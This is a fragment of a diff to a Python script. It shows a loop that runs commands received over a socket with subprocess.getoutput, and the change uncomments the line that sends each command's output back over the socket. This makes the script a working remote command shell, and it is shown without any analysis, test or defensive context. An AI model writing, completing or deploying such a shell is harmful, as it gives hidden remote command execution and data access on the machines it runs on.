@@ -9,5 +9,5 @@ while True:
 	if command.lower() == 'exit':
 		break
 	output = subprocess.getoutput(command)
-	#s.send(output.encode())
+	s.send(output.encode())
 s.close()
